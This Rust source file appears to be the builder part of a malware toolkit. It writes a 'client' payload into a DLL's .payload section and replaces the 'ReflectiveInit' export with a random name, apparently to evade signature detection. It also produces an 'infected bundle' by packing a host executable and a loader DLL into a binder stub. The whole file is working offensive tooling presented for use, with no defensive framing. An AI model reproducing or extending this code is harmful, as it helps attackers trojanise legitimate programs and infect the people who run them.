use std::fs;
use std::path::Path;
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;
use object::read::pe::PeFile64;
use object::{Object, ObjectSection, LittleEndian};
use object::pe;

pub fn embed_client_in_dll(dll_path: &Path, client_path: &Path, volatile: bool) -> Result<(), String> {
    let mut dll_bytes = fs::read(dll_path).map_err(|e| e.to_string())?;
    let client_bytes = fs::read(client_path).map_err(|e| e.to_string())?;

    patch_section_by_name(&mut dll_bytes, ".payload", &client_bytes)?;

    // Patch config for volatile mode
    let config_str = if volatile { "VOLATILE=TRUE\0" } else { "VOLATILE=FALSE\0" };
    patch_section_by_name(&mut dll_bytes, ".config", config_str.as_bytes())?;

    fs::write(dll_path, dll_bytes).map_err(|e| e.to_string())?;
    Ok(())
}

pub fn randomize_dll_exports(dll_path: &Path) -> Result<String, String> {
    let mut dll_bytes = fs::read(dll_path).map_err(|e| e.to_string())?;

    let random_name: String = thread_rng()
        .sample_iter(&Alphanumeric)
        .take(12)
        .map(char::from)
        .collect();

    match patch_export_table(&mut dll_bytes, "ReflectiveInit", &random_name) {
        Ok(_) => {
             fs::write(dll_path, dll_bytes).map_err(|e| e.to_string())?;
             Ok(random_name)
        },
        Err(e) => {
            println!("Export table patching failed, using fallback: {}", e);
            // Fallback to primitive search and replace
            let target = b"ReflectiveInit\0";
            if let Some(pos) = dll_bytes.windows(target.len()).position(|window| window == target) {
                let name_bytes = random_name.as_bytes();
                for i in 0..name_bytes.len() {
                    dll_bytes[pos + i] = name_bytes[i];
                }
                dll_bytes[pos + name_bytes.len()] = 0;
                fs::write(dll_path, dll_bytes).map_err(|e| e.to_string())?;
                Ok(random_name)
            } else {
                Ok("Default".to_string())
            }
        }
    }
}

fn patch_export_table(bytes: &mut [u8], old_name: &str, new_name: &str) -> Result<(), String> {
    let file = PeFile64::parse(&*bytes).map_err(|e| e.to_string())?;

    let export_table = file.data_directory(pe::IMAGE_DIRECTORY_ENTRY_EXPORT)
        .ok_or("No export directory")?;

    let (offset, _size) = file.section_offsets(export_table.virtual_address.get(LittleEndian))
        .ok_or("Export directory address not in any section")?;

    let export_dir = pe::ImageExportDirectory::parse(&bytes[offset as usize..])
        .map_err(|e| e.to_string())?;

    let num_names = export_dir.number_of_names.get(LittleEndian);
    let name_ptr_table_rva = export_dir.address_of_names.get(LittleEndian);

    let (name_ptr_offset, _) = file.section_offsets(name_ptr_table_rva)
        .ok_or("Name pointer table not in section")?;

    for i in 0..num_names {
        let name_ptr_rva_offset = name_ptr_offset as usize + (i as usize * 4);
        let name_rva = LittleEndian::read_u32(&bytes[name_ptr_rva_offset..name_ptr_rva_offset+4]);

        let (name_offset, _) = file.section_offsets(name_rva)
            .ok_or("Name string RVA not in section")?;

        let mut name_end = name_offset as usize;
        while name_end < bytes.len() && bytes[name_end] != 0 {
            name_end += 1;
        }

        let current_name = std::str::from_utf8(&bytes[name_offset as usize..name_end]).unwrap_or("");
        if current_name == old_name {
            if new_name.len() > (name_end - name_offset as usize) {
                return Err("New export name too long for slot".to_string());
            }

            let name_bytes = new_name.as_bytes();
            for j in 0..name_bytes.len() {
                bytes[name_offset as usize + j] = name_bytes[j];
            }
            bytes[name_offset as usize + name_bytes.len()] = 0; // Null terminator
            return Ok(());
        }
    }

    Err("Export name not found in table".to_string())
}

pub fn create_infected_bundle(
    binder_stub_path: &Path,
    host_exe_path: &Path,
    loader_dll_path: &Path,
    dll_name: &str,
    output_path: &Path
) -> Result<(), String> {
    let mut binder_bytes = fs::read(binder_stub_path).map_err(|e| e.to_string())?;
    let host_bytes = fs::read(host_exe_path).map_err(|e| e.to_string())?;
    let dll_bytes = fs::read(loader_dll_path).map_err(|e| e.to_string())?;

    patch_section_by_name(&mut binder_bytes, ".host", &host_bytes)?;
    patch_section_by_name(&mut binder_bytes, ".dll", &dll_bytes)?;

    // Patch config (DLL name)
    let mut config_data = [0u8; 1024];
    let dll_name_bytes = dll_name.as_bytes();
    let len = std::cmp::min(dll_name_bytes.len(), 1023);
    config_data[..len].copy_from_slice(&dll_name_bytes[..len]);

    patch_section_by_name(&mut binder_bytes, ".config", &config_data)?;

    fs::write(output_path, binder_bytes).map_err(|e| e.to_string())?;
    Ok(())
}

fn patch_section_by_name(bytes: &mut [u8], section_name: &str, data: &[u8]) -> Result<(), String> {
    let file = PeFile64::parse(&*bytes).map_err(|e| format!("Failed to parse PE: {}", e))?;

    let section = file.sections()
        .find(|s| s.name().unwrap_or("") == section_name)
        .ok_or_else(|| format!("Section {} not found", section_name))?;

    let (offset, size) = section.file_range()
        .ok_or_else(|| format!("Section {} has no file range", section_name))?;

    if data.len() > size as usize {
        return Err(format!("Data too large for section {} ({} > {})", section_name, data.len(), size));
    }

    let start = offset as usize;
    for (i, &byte) in data.iter().enumerate() {
        bytes[start + i] = byte;
    }

    // Optionally zero out the rest of the section
    for i in data.len()..(size as usize) {
        bytes[start + i] = 0;
    }

    Ok(())
}
